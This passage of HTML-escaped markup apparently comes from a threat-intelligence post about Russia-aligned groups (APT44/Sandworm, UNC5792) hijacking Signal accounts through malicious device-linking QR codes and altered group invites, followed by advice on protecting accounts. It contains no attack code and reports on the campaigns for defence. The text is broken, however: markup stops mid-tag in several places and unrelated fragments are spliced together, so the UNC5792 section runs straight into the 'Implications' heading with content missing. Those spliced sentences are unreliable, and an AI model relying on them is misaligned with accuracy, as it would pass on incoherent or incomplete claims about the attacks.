website.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIn more tailored remote phishing operations, malicious device-linking QR codes have been embedded in phishing pages crafted to appear as specialized applications used by the Ukrainian military.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eBeyond remote phishing and malware delivery operations, we have also seen malicious QR codes being used in close-access operations. \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eAPT44\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (aka Sandworm or Seashell Blizzard, a threat actor attributed by \u003c/span\u003e\u003ca href\u003d\"https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003emultiple\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e governments to the Main Centre for Special Technologies (GTsST) within Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GU), known commonly as the GRU) has worked to enable forward-deployed Russian military forces to link Signal accounts on devices captured on the battlefield back to actor-controlled infrastructure for follow-on exploitation.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eNotably, this device-linking concept of operations has proven to be a low-signature form of initial access due to the lack of centralized, technology-driven detections and defenses that can be used to monitor for account compromise via newly linked devices; when successful, there is a high risk that a compromise can go unnoticed for extended periods of time.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC5792: Modified Signal Group Invites\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo compromise Signal accounts using the device-linking feature, one suspected Russian espionage cluster tracked as UNC5792 (which partially overlaps with CERT-UA's \u003c/span\u003e\u003ca href\u003d\"https://cert.gov.ua/article/6278735\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan \"\u003c/span\u003e\u003ca href\u003d\"https://support.signal.org/hc/en-us/articles/360051086971-Group-Link-or-QR-code\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan phishing campaigns, replacing the expected redirection to a Signal group with a redirection to a malicious URL crafted to link an actor-controlled device to the victim's Signal account.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan Signal group invite.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan Implications\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe operational emphasis on Signal from multiple threat actors in recent months serves as an important warning for the growing threat to secure messaging applications that is certain to intensify in the near-term. When placed in a wider context with other trends in the threat landscape, such as the growing commercial spyware industry and the surge of mobile malware variants being leveraged in active conflict zones, there appears to be a clear and growing demand for offensive cyber capabilities that can be used to monitor the sensitive communications of individuals who rely on secure messaging applications to safeguard their online activity.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAs reflected in wide ranging efforts to compromise Signal accounts, this threat to secure messaging applications is not limited to remote cyber operations such as phishing and malware delivery, but also critically includes close-access operations where a threat actor can secure brief access to a target's unlocked device. Equally important, this threat is not only limited to Signal, but also extends to other widely used messaging platforms, including WhatsApp and Telegram, which have likewise factored into the targeting priorities of several of the aforementioned Russia-aligned groups in recent months. For an example of this wider targeting interest, see Microsoft Threat Intelligence's \u003c/span\u003e\u003ca href\u003d\"https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003erecent blog post\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e on a COLDRIVER (aka UNC4057 and Star Blizzard) campaign attempting to abuse the linked device feature to compromise WhatsApp accounts.  \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePotential targets of government-backed intrusion activity targeting their personal devices should adopt practices to help safeguard themselves, including:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEnable \u003c/span\u003e\u003ca href\u003d\"https://support.google.com/android/answer/9079129?hl\u003den\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003escreen lock\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e on all mobile devices using a long, complex password with a mix of uppercase and lowercase letters, numbers, and symbols. Android supports alphanumeric passwords, which offer significantly more security than numeric-only PINs or patterns.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eInstall operating system updates as soon as possible and always use the latest version of Signal and other messaging apps.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEnsure \u003c/span\u003e\u003ca href\u003d\"https://support.google.com/googleplay/answer/2812853?hl\u003den\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eGoogle Play Protect\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e is enabled, which is on by default on Android devices with Google Play Services. Google Play Protect checks your apps and devices for harmful behavior and can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAudit linked devices regularly for unauthorized devices by navigating to the \"Linked devices\" section in the application's settings.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eExercise caution when interacting with QR codes and web resources purporting to be software updates, group invites, or other notifications that appear legitimate and urge immediate action.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIf available, use two-factor authentication such as fingerprint, facial recognition, a security key, or a one-time code to verify when your account is logged into or linked to a new device.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan
